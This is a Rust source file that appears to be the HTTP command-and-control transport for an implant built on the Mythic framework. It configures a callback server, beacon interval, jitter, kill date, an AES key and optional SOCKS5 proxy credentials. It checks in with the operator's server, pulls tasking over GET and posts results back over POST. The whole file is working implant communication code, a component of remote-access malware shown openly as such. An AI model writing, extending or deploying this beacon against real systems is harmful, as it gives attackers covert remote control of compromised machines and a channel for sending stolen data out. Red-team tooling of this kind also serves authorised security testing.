use super::C2Trait;
use crate::{MythicError, MythicResult, base64_decode};
use minreq::{
    Method::{self, Get, Post},
    Proxy, Request, Response,
};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

#[derive(Debug, Deserialize, Serialize)]
pub struct Http {
    #[serde(default)]
    pub aes_psk: String,
    pub callback_host: String,
    pub callback_port: u16,
    pub callback_interval: u64,
    pub callback_jitter: u32,
    pub encrypted_exchange_check: bool,
    pub get_uri: String,
    pub post_uri: String,
    pub query_path_name: String,
    pub headers: HashMap<String, String>,
    pub killdate: String,
    pub proxy_host: String,
    pub proxy_port: String,
    pub proxy_user: String,
    pub proxy_pass: String,
}

impl Http {
    fn request(&self, method: Method, url: &str, data: &str) -> MythicResult<String> {
        let req = Request::new(method, url).with_headers(&self.headers);

        let req = if self.proxy_host.len() > 4 && self.proxy_port.len() > 1 {
            let proxy_url = format!(
                "socks5://{}:{}@{}:{}",
                self.proxy_user, self.proxy_pass, self.proxy_host, self.proxy_port
            );
            let proxy = Proxy::new(proxy_url).map_err(|_| MythicError::transport(1))?;
            req.with_proxy(proxy)
        } else {
            req
        }
        .with_body(data);

        let resp = req.send().map_err(|_| MythicError::transport(2))?;

        read_response(resp)
    }

    fn get(&self, data: &str) -> MythicResult<String> {
        let url = format!(
            "{}:{}/{}/?{}={}",
            self.callback_host, self.callback_port, self.get_uri, self.query_path_name, data
        );
        self.request(Get, &url, "")
    }

    fn post(&self, data: &str) -> MythicResult<String> {
        let url = format!(
            "{}:{}/{}",
            self.callback_host, self.callback_port, self.post_uri
        );
        self.request(Post, &url, data)
    }
}

impl C2Trait for Http {
    fn get_aes_psk(&self) -> [u8; 32] {
        let aes_psk = base64_decode(&self.aes_psk).unwrap();
        let aes_psk: [u8; 32] = aes_psk.try_into().unwrap();
        aes_psk
    }

    fn set_aes_psk(&mut self, key: &str) {
        self.aes_psk = key.to_string();
    }

    fn encrypted_exchange_check(&self) -> bool {
        self.encrypted_exchange_check
    }

    fn checkin(&self, packed: &str) -> MythicResult<String> {
        self.post(packed)
    }

    fn get_tasking(&self, packed: &str) -> MythicResult<String> {
        self.get(packed)
    }

    fn post_response(&self, packed: &str) -> MythicResult<String> {
        self.post(packed)
    }
}

fn read_response(resp: Response) -> MythicResult<String> {
    let status = resp.status_code as u16;
    if status >= 400 {
        return Err(MythicError::HttpStatus(status));
    }
    resp.as_str()
        .map_err(|e| MythicError::transport(format!("{e}")))
        .map(|s| s.to_string())
}
